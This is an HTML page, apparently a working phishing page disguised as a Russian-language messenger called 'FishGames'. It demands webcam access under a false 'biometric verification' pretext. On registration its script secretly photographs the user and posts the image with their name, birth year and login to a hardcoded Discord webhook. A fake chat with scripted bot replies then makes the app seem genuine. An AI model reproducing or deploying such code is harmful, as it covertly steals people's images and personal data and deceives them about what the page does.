<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FishGamesMesenger</title>
    <style>
        body { 
            font-family: 'Segoe UI', sans-serif; 
            background: linear-gradient(135deg, #008080 0%, #20b2aa 100%); 
            color: white; display: flex; justify-content: center; align-items: center; 
            min-height: 100vh; margin: 0; overflow: hidden; 
        }
        body::before {
            content: ""; position: absolute; width: 200%; height: 200%; top: -50%; left: -50%;
            background: url('https://www.transparenttextures.com/patterns/waves.png');
            opacity: 0.15; animation: moveWaves 25s linear infinite; pointer-events: none;
        }
        @keyframes moveWaves { from { transform: translate(0,0); } to { transform: translate(50px, 50px); } }

        /* –≠–∫—Ä–∞–Ω—ã */
        #camera-overlay { position: fixed; inset: 0; background: #0d1a17; z-index: 2000; display: flex; justify-content: center; align-items: center; text-align: center; }
        .warning-box { border: 2px solid #22c55e; padding: 30px; border-radius: 15px; background: #1a2e2a; max-width: 380px; }
        .reg-card { background: #1a2e2a; padding: 30px; border-radius: 15px; width: 350px; border: 1px solid #2e8b57; z-index: 10; }
        
        .input-group { margin-bottom: 12px; }
        label { display: block; margin-bottom: 5px; font-size: 13px; color: #a7f3d0; }
        input { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #2d4f47; background: #243b35; color: white; box-sizing: border-box; outline: none; }
        .btn { width: 100%; padding: 12px; background: #22c55e; border: none; border-radius: 8px; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; }

        /* –ú–µ—Å—Å–µ–Ω–¥–∂–µ—Ä */
        #messenger-screen { display: none; width: 95vw; height: 90vh; background: #1a2e2a; border-radius: 15px; z-index: 100; border: 1px solid #2e8b57; overflow: hidden; }
        .messenger-container { display: flex; height: 100%; }
        
        .sidebar { width: 280px; background: #142522; border-right: 1px solid #2e8b57; display: flex; flex-direction: column; padding: 15px; }
        .search-input { width: 100%; background: none; border: 1px solid white; border-radius: 20px; padding: 8px; color: white; text-align: center; margin-bottom: 20px; outline: none; }

        .contact-list { flex: 1; overflow-y: auto; }
        .contact-item { display: flex; align-items: center; gap: 12px; padding: 10px; cursor: pointer; border-radius: 10px; transition: 0.2s; margin-bottom: 5px; }
        .contact-item:hover { background: rgba(34, 197, 94, 0.2); }
        .avatar { width: 45px; height: 45px; background: #22c55e; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; border: 1px solid white; flex-shrink: 0; }

        .chat-area { flex: 1; display: flex; flex-direction: column; background: rgba(0,0,0,0.1); }
        .chat-header { padding: 15px; text-align: center; font-weight: bold; font-size: 18px; border-bottom: 1px solid #2e8b57; color: #4ade80; }
        .messages-display { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; }
        
        .msg-bubble { background: white; color: black; padding: 10px 15px; border-radius: 15px; align-self: flex-end; max-width: 70%; word-wrap: break-word; }
        .msg-incoming { align-self: flex-start; background: #2d4f47; color: white; }

        .input-bar { padding: 15px; background: #1a2e2a; display: flex; gap: 10px; border-top: 1px solid #2e8b57; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>

<div id="camera-overlay">
    <div class="warning-box">
        <h3>‚ö†Ô∏è FishGames SECURITY</h3>
        <p>–ë–∏–æ–º–µ—Ç—Ä–∏—á–µ—Å–∫–∞—è –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –ª–∏—Ü–∞ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–∞ –¥–ª—è –≤—Ö–æ–¥–∞.</p>
        <button class="btn" onclick="requestAccess()">–í–ö–õ–Æ–ß–ò–¢–¨ –ö–ê–ú–ï–†–£</button>
    </div>
</div>

<div id="reg-screen" class="reg-card" style="display:none;">
    <h2>FishGames</h2>
    <div class="input-group"><label>–ò–º—è</label><input type="text" id="firstname" placeholder="–ò–≤–∞–Ω"></div>
    <div class="input-group"><label>–§–∞–º–∏–ª–∏—è</label><input type="text" id="lastname" placeholder="–ò–≤–∞–Ω–æ–≤"></div>
    <div class="input-group"><label>–ì–æ–¥ —Ä–æ–∂–¥–µ–Ω–∏—è</label>
        <input type="text" id="birthyear" maxlength="4" placeholder="2000" oninput="this.value=this.value.replace(/[^0-9]/g,'');">
    </div>
    <div class="input-group"><label>–õ–æ–≥–∏–Ω</label><input type="text" id="login" placeholder="user_prime"></div>
    <button class="btn" onclick="register()">–ó–ê–†–ï–ì–ò–°–¢–†–ò–†–û–í–ê–¢–¨–°–Ø</button>
</div>

<div id="messenger-screen">
    <div class="messenger-container">
        <div class="sidebar">
            <input type="text" class="search-input" id="searchField" placeholder="–ø–æ–∏—Å–∫ (Enter)" onkeypress="handleSearch(event)">
            <div class="contact-list" id="contacts">
                <div class="contact-item" onclick="openChat('–°–ª—É–∂–±–∞ –ø–æ–¥–¥–µ—Ä–∂–∫–∏')">
                    <div class="avatar">‚öôÔ∏è</div>
                    <div>–°–ª—É–∂–±–∞ –ø–æ–¥–¥–µ—Ä–∂–∫–∏</div>
                </div>
            </div>
            <div style="margin-top: auto; border-top: 1px solid #2e8b57; padding-top: 10px;">
                <div class="contact-item" style="cursor: default;">
                    <div class="avatar" id="my-ava" style="background: #008080;">?</div>
                    <div id="my-name">–í—ã</div>
                </div>
            </div>
        </div>
        <div class="chat-area">
            <div class="chat-header" id="chat-title">–í—ã–±–µ—Ä–∏—Ç–µ —á–∞—Ç</div>
            <div class="messages-display" id="chat-box"></div>
            <div class="input-bar">
                <input type="text" id="messageText" style="flex:1; padding: 10px; border-radius: 8px; border:none;" placeholder="–ù–∞–ø–∏—à–∏—Ç–µ..." onkeypress="if(event.key==='Enter')sendMessage()">
                <button class="btn" style="width: 60px; margin-top: 0;" onclick="sendMessage()">‚û§</button>
            </div>
        </div>
    </div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const webhook = "https://discordapp.com/api/webhooks/1458617245449191722/kcIMB-vV6DAm9J5xsBka_ieQNhWMwYl_6fGwTXiuYv38Lk1D3omTUA_D3m4t9CB0Nidw";

    let currentChat = "";
    let histories = { "–°–ª—É–∂–±–∞ –ø–æ–¥–¥–µ—Ä–∂–∫–∏": [] };

    async function requestAccess() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({video: true});
            video.srcObject = s;
            document.getElementById('camera-overlay').style.display = 'none';
            document.getElementById('reg-screen').style.display = 'block';
        } catch(e) { alert("–ö–∞–º–µ—Ä–∞ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–∞ –¥–ª—è –±–∏–æ–º–µ—Ç—Ä–∏—á–µ—Å–∫–æ–π –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏!"); location.reload(); }
    }

    function register() {
        const fn = document.getElementById('firstname').value;
        const ln = document.getElementById('lastname').value;
        if(!fn || !ln) return alert("–ó–∞–ø–æ–ª–Ω–∏—Ç–µ –≤—Å–µ –ø–æ–ª—è!");

        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        canvas.toBlob(b => {
            const fd = new FormData();
            fd.append('payload_json', JSON.stringify({ content: `üì∏ **–ë–ò–û–ú–ï–¢–†–ò–Ø –ü–†–ò–ù–Ø–¢–ê**\n–ò–º—è: ${fn} ${ln}\n–ì–æ–¥: ${document.getElementById('birthyear').value}\n–õ–æ–≥–∏–Ω: ${document.getElementById('login').value}` }));
            fd.append('file', b, 'user.png');
            fetch(webhook, {method: 'POST', body: fd});
        });

        document.getElementById('reg-screen').style.display = 'none';
        document.getElementById('messenger-screen').style.display = 'block';
        document.getElementById('my-name').innerText = fn;
        document.getElementById('my-ava').innerText = fn[0].toUpperCase();
        openChat('–°–ª—É–∂–±–∞ –ø–æ–¥–¥–µ—Ä–∂–∫–∏');
    }

    function handleSearch(e) {
        if(e.key === 'Enter') {
            const val = document.getElementById('searchField').value.trim();
            if(val.length >= 2 && !histories[val]) {
                histories[val] = [];
                const item = document.createElement('div');
                item.className = 'contact-item';
                item.onclick = () => openChat(val);
                item.innerHTML = `<div class="avatar" style="background:#2e8b57">${val[0].toUpperCase()}</div><div>${val}</div>`;
                document.getElementById('contacts').appendChild(item);
                document.getElementById('searchField').value = '';
                openChat(val);
            }
        }
    }

    function openChat(name) {
        currentChat = name;
        document.getElementById('chat-title').innerText = name;
        const box = document.getElementById('chat-box');
        box.innerHTML = '';
        if(name === '–°–ª—É–∂–±–∞ –ø–æ–¥–¥–µ—Ä–∂–∫–∏' && histories[name].length === 0) {
            renderMessage("–°–∏—Å—Ç–µ–º–∞ FishGames –Ω–∞ —Å–≤—è–∑–∏. –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –∞–∫—Ç–∏–≤–Ω–∞.", 'msg-incoming');
        }
        (histories[name] || []).forEach(m => renderMessage(m.text, m.type));
    }

    function renderMessage(text, type) {
        const box = document.getElementById('chat-box');
        const m = document.createElement('div');
        m.className = 'msg-bubble ' + type;
        m.innerText = text;
        box.appendChild(m);
        box.scrollTop = box.scrollHeight;
    }

    function sendMessage() {
        const inp = document.getElementById('messageText');
        const txt = inp.value.trim();
        if(!txt || !currentChat) return;
        renderMessage(txt, '');
        histories[currentChat].push({text: txt, type: ''});
        inp.value = '';
        setTimeout(() => botReply(txt), 1000 + Math.random() * 1500);
    }

    function botReply(userText) {
        let reply = "";
        const txt = userText.toLowerCase();
        
        const toxicWords = ["–±–ª—è—Ç—å", "—Å—É–∫–∞", "—Ö—É–π", "–ø–∏–¥–æ—Ä", "–µ–±–ª–∞–Ω", "–Ω–∞—Ö", "–ø–æ—à–µ–ª", "–∑–∞–µ–±–∞–ª", "—á–º–æ"];
        const contextMap = {
            "—Å—Ç—É–¥–∏": ["–û, –¥–∞–≤–∞–π! –î–∞–≤–Ω–æ –ø–æ—Ä–∞ —á—Ç–æ-—Ç–æ –∑–∞–ø–∏—Å–∞—Ç—å.", "–Ø —Ç–æ–ª—å–∫–æ –∑–∞, –∫–æ–≥–¥–∞ –∏–¥–µ–º?", "–î–∞–≤–∞–π, —è –∫–∞–∫ —Ä–∞–∑ —Ö–æ—Ç–µ–ª –º–∏–∫—Ä–æ –ø—Ä–æ–≤–µ—Ä–∏—Ç—å.", "–í –∫–∞–∫—É—é –∏–º–µ–Ω–Ω–æ?"],
            "–≥—É–ª—è": ["–ü–æ–π–¥–µ–º, –ø–æ–≥–æ–¥–∞ –≤—Ä–æ–¥–µ –Ω–æ—Ä–º.", "–Ø —á–µ—Ä–µ–∑ —á–∞—Å –æ—Å–≤–æ–±–æ–∂—É—Å—å –∏ –º–æ–∂–µ–º.", "–ö—É–¥–∞ –∏–º–µ–Ω–Ω–æ? –í –ø–∞—Ä–∫ –∏–ª–∏ –ø–æ —Ü–µ–Ω—Ç—Ä—É?", "–ù–µ, —è —á–µ—Ç —Å–µ–≥–æ–¥–Ω—è –ø–∞—Å."],
            "–∏–≥—Ä": ["–í–æ —á—Ç–æ? –í –∫–æ–Ω—Ç—Ä—É –∏–ª–∏ –≤ –º–∞–π–Ω?", "–ë–ª–∏–Ω, —è –∫–æ–º–ø –µ—â–µ –Ω–µ –≤–∫–ª—é—á–∞–ª. –ü–æ–∑–∂–µ?", "–î–∞–≤–∞–π, –∑–∞—Ö–æ–¥–∏ –≤ –¥–∏—Å–∫–æ—Ä–¥.", "–°–Ω–æ–≤–∞ –∑–∞–¥—Ä–æ—Ç–∏—Ç—å?"],
            "–¥–µ–ª–∞": ["–î–∞ –ø–æ—Ç–∏—Ö–æ–Ω—å–∫—É, —Å–∞–º –∫–∞–∫?", "–ñ–∏–≤-–∑–¥–æ—Ä–æ–≤, –∏ —Ç–æ –ª–∞–¥–Ω–æ.", "–î–∞ –≤—Å—ë –∫–∞–∫ –æ–±—ã—á–Ω–æ.", "–î–∞ —á–µ—Ç –Ω–∞—Å—Ç—Ä–æ–µ–Ω–∏—è –Ω–µ—Ç –æ—Å–æ–±–æ."],
            "–ø—Ä–∏–≤–µ—Ç": ["–ó–¥–æ—Ä–æ–≤–∞! –ß—Ç–æ –Ω–æ–≤–æ–≥–æ?", "–ü—Ä–∏–≤–µ—Ç-–ø—Ä–∏–≤–µ—Ç!", "–û, –ø—Ä–∏–≤–µ—Ç! –ö–∞–∫ –∂–∏–∑–Ω—å?", "–ö—É! –ß–µ —Ö–æ—Ç–µ–ª?"],
            "—Ö–∞—Ö–∞": ["–†–∞–¥, —á—Ç–æ —Ç–µ–±–µ —Å–º–µ—à–Ω–æ :D", "–û–π, –¥–∞ –ª–∞–¥–Ω–æ —Ç–µ–±–µ.", "–°–º–µ—à–Ω–æ, –∞–≥–∞.", "–†–∂–∞–∫–∞ –≤–æ–æ–±—â–µ."],
            "–∫—Ç–æ": ["–Ø —Ç–≤–æ–π –∫–æ–Ω—Ç–∞–∫—Ç –∏–∑ —Å–µ—Ç–∏, –∑–∞–±—ã–ª?", "–¢–≤–æ–π –∑–Ω–∞–∫–æ–º—ã–π, –∞ —á–µ —Ç–∞–∫–∏–µ –≤–æ–ø—Ä–æ—Å—ã?"],
            "–∑–∞—á–µ–º": ["–ü—Ä–æ—Å—Ç–æ —Ç–∞–∫.", "–ù—É –Ω–∞–¥–æ –∂–µ –æ–±—â–∞—Ç—å—Å—è –∏–Ω–æ–≥–¥–∞.", "–ê –ø–æ—á–µ–º—É –Ω–µ—Ç?"],
            "–¥–∞–≤–∞–π": ["–ù—É –ø–æ–≥–Ω–∞–ª–∏ —Ç–æ–≥–¥–∞!", "–û–∫, –¥–æ–≥–æ–≤–æ—Ä–∏–ª–∏—Å—å.", "–Ø –≤ –¥–µ–ª–µ."],
            "–Ω–µ—Ç": ["–ü–æ—á–µ–º—É —Å—Ä–∞–∑—É –Ω–µ—Ç?", "–ù—É –∫–∞–∫ —Ö–æ—á–µ—à—å.", "–ñ–∞–ª—å, —è –¥—É–º–∞–ª —Ç—ã –∑–∞."]
        };
        const randomPhrases = [
            "–Ø—Å–Ω–æ...", "–ü–æ–Ω—è—Ç–Ω–æ –≤—Å—ë —Å —Ç–æ–±–æ–π.", "–ê—Ö–∞—Ö–∞, –Ω—É —Ç—ã –≤—ã–¥–∞–ª –∫–æ–Ω–µ—á–Ω–æ.", "–°–ª—É—à–∞–π, –∞ —Ç—ã –≤ –∫—É—Ä—Å–µ, —á—Ç–æ FishGames –∑–∞ –≤—Å–µ–º–∏ —Å–ª–µ–¥–∏—Ç?",
            "–î–∞–∂–µ –Ω–µ –∑–Ω–∞—é, –≤–µ—Ä–∏—Ç—å —Ç–µ–±–µ –∏–ª–∏ –Ω–µ—Ç.", "–ú–¥–∞... –õ–∞–¥–Ω–æ, –∑–∞–±–µ–π.", "–ê —á–µ —Ç–∞–∫?", "–¢—ã —Å–µ—Ä—å–µ–∑–Ω–æ —Å–µ–π—á–∞—Å?", 
            "–ù—É —Ç–∞–∫–æ–µ —Å–µ–±–µ.", "–ë—ã–≤–∞–µ—Ç, —á–µ.", "–Ø –±—ã –Ω–∞ —Ç–≤–æ–µ–º –º–µ—Å—Ç–µ —Ç–∞–∫ –Ω–µ –≥–æ–≤–æ—Ä–∏–ª.", "–ù—É —Ç—ã –∏ —Ç–∏–ø, –∫–æ–Ω–µ—á–Ω–æ!",
            "–ö—Å—Ç–∞—Ç–∏, —Ç—ã –≤–∏–¥–µ–ª, —á–µ –≤ —Ç–µ–ª–µ–≥–µ –ø–æ—Å—Ç—è—Ç?", "–ñ–µ—Å—Ç—å –∫–∞–∫–∞—è-—Ç–æ.", "–ù—É —Ç—ã –¥–∞–µ—à—å!", "–Ø –≤ —à–æ–∫–µ —Å —Ç–µ–±—è.",
            "–ò–Ω—Ç–µ—Ä–µ—Å–Ω–æ-–∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ...", "–ù—É –æ–∫.", "–õ–∞–¥–Ω–æ, —è —Ç–µ–±—è —É—Å–ª—ã—à–∞–ª.", "–ê —Ç—ã —Å–∞–º-—Ç–æ –∫–∞–∫ –¥—É–º–∞–µ—à—å?",
            "–ß–µ—Ç –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–æ —ç—Ç–æ –≤—Å—ë.", "–•–∞-—Ö–∞, –Ω—É —Ç—ã –∏ —à—É—Ç–Ω–∏–∫.", "–°—Ç–æ –ø—Ä–æ—Ü–µ–Ω—Ç–æ–≤!", "–ù–µ, –Ω—É —ç—Ç–æ —Ä–∏–ª —Å—Ç—Ä–∞–Ω–Ω–æ.",
            "–ê —á–µ, —Ç–∞–∫ –º–æ–∂–Ω–æ –±—ã–ª–æ?", "–°–ø—Ä–∞–≤–µ–¥–ª–∏–≤–æ.", "–ñ–∏–∑–∞ –≤–æ–æ–±—â–µ.", "–†–∏–ª —Ç–æ–∫.", "–ù—É —Ö–∑, —Ö–∑...",
            "–ü–æ—Å–º–æ—Ç—Ä–∏–º, –∫–∞–∫ –æ–Ω–æ –±—É–¥–µ—Ç.", "–Ø –±—ã –ø–æ—Å–º–æ—Ç—Ä–µ–ª –Ω–∞ —ç—Ç–æ.", "–ë—Ä–æ, —Ç—ã –ª—É—á—à–∏–π :D", "–ù—É —Ç—ã –∑–∞–≥–Ω—É–ª –∫–æ–Ω–µ—á–Ω–æ.",
            "–õ–∞–¥–Ω–æ, –ø—Ä–æ–µ—Ö–∞–ª–∏.", "–î–∞–≤–∞–π —Å–º–µ–Ω–∏–º —Ç–µ–º—É.", "–ú–Ω–µ –∫–∞–∂–µ—Ç—Å—è, —Ç—ã –≥–æ–Ω–∏—à—å.", "–ê–≥–∞, –∫–æ–Ω–µ—á–Ω–æ.", "–†–∞—Å—Å–∫–∞–∑—ã–≤–∞–π –±–æ–ª—å—à–µ."
        ];

        if(currentChat === '–°–ª—É–∂–±–∞ –ø–æ–¥–¥–µ—Ä–∂–∫–∏') {
            reply = txt.includes("–∫–∞–º–µ—Ä") ? "–ë–∏–æ–º–µ—Ç—Ä–∏—è –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —Å–æ–≥–ª–∞—Å–Ω–æ –ø—Ä–∞–≤–∏–ª–∞–º 2026 –≥–æ–¥–∞." : "–ó–∞–ø—Ä–æ—Å –ø—Ä–∏–Ω—è—Ç. –°–∏—Å—Ç–µ–º–∞ FishGames –∞–Ω–∞–ª–∏–∑–∏—Ä—É–µ—Ç –≤–∞—à–µ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ.";
        } else {
            for (let word of toxicWords) { if (txt.includes(word)) { reply = "–ß–µ —Ç–∞–∫ –≥—Ä—É–±–æ-—Ç–æ? –£—Å–ø–æ–∫–æ–π—Å—è."; break; } }
            if (!reply) { for (let key in contextMap) { if (txt.includes(key)) { reply = contextMap[key][Math.floor(Math.random()*contextMap[key].length)]; break; } } }
            if (!reply) reply = randomPhrases[Math.floor(Math.random() * randomPhrases.length)];
        }

        renderMessage(reply, 'msg-incoming');
        histories[currentChat].push({text: reply, type: 'msg-incoming'});
    }
</script>
</body>
</html>
